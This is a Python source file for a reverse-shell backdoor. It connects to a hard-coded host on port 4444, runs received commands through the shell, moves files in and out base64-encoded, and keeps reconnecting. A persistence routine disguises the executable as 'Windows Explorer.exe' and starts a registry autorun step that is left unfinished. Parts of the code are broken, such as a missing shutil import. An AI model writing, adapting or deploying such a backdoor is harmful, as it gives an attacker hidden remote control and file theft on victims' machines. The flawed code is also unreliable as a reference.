import socket
import json
import subprocess
import os
import base64
import sys
class Backdoor:

    def __init__(self,ip, port):
        self.connection= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        
    def reliable_send(self,data):
        
        json_data=json.dumps(data)
        json_data=json_data.encode('ascii')
        self.connection.send(json_data)
        
    def change_directory(self,path):
        os.chdir(path)
        return "[+] Changing Directory to "+path
        
    def become_persistance(self):
        file_loc=os.environ["appdata"]+"\\Windows Explorer.exe"
        shutil.copyfile(sys.executable,file_loc)
        subprocess.call('reg add')
    
    def reliable_recv(self):
        json_data=""
        while True:
            try:
                json_data+=self.connection.recv(1024).decode('ascii')
                return json.loads(json_data)
            except ValueError :
                continue
    
    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())
    
    def write_file(self,path, data):
        with open(path,"wb") as file:
            file.write(base64.b64decode(data))
            
        return "[+] Upload Successful ".encode()

    
    def execute_command(self,command):
        results=subprocess.check_output(command,shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
        return results
    def run(self):
        while True:
            command=self.reliable_recv()
            try:
                if command[0]=="quit":
                    self.connection.close()
                    sys.exit()
                
                
                elif command[0]=='cd' and len(command)>1:
                    command_result=self.change_directory(command[1])
                    command_result= command_result.encode()
                
                elif command[0]=='download':
                    command_result=self.read_file(command[1])
                    print('*'*10," "*5,command_result,'*'*10)
                
                elif command[0]=='upload' and len(command)>2:
                    command_result=self.write_file(command[1],command[-1])
                    print("data written")
                else:
                    command_result=self.execute_command(command)
            except Exception:
                command_result="[-] Error During Execution".encode()
                
            self.reliable_send(command_result.decode())


while True:
    try:
        my_backdoor=Backdoor('192.168.154.133',4444)
        my_backdoor.run()
    except Exception:
        continue




